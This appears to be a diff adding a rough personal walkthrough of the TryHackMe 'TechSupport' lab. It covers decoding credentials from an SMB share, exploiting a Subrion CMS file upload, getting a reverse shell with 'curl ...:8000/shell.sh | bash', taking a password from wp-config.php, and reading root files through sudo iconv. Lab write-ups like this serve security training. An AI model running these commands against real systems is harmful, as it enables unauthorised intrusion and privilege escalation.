@@ -56,4 +56,52 @@ smb: \> ls
 smb: \> 
 ```
 
+from share i gor cred which where incripted with magic formula i decrepted with cybercheif website with magic option 
 
+then i login into subrion cms with creds
+then i searvch for cms version online and got many exploit 
+Subrion CMS 4.2.1 - Arbitrary File Upload
+
+i successfully gain access but acces was limited so i make a reverse shell and started a listner and uploaded the listner to webserver and curl from victim maCHIN
+```──(kali㉿kali)-[~]
+└─$ nano shell.sh               
+                                                                                                        
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.191.223 - - [02/Jan/2024 17:59:58] "GET /shell.sh HTTP/1.1" 200 -
+^C
+```
+```$ pwd
+/var/www/html/subrion/uploads
+
+$ whoami
+www-data
+
+$ curl 10.2.56.209:8000/shell.sh | bash
+
+```
+
+tryhackme-->techsupport plese check 
+
+
+as websiter was having wordpress so i found the wp-config.php file which was under var/www/html/  where there was a password i tied this password for other user in the sysytem and it worked then i try sudo -l there i found
+```scamsite@TechSupport:/$ cd root
+cd root
+bash: cd: root: Permission denied
+scamsite@TechSupport:/$ sudo -l
+sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+scamsite@TechSupport:/$ sudo -u root iconv  -f 8859_1 -t 8859_1 "/root/root.txt"
+<o -u root iconv  -f 8859_1 -t 8859_1 "/root/root.txt"                       
+851b8233a8c09400ec30651bd1529bf1ed02790b  -
+scamsite@TechSupport:/$ 
+```
+
+
+then from gobins i found the exploit but need to understqand the code
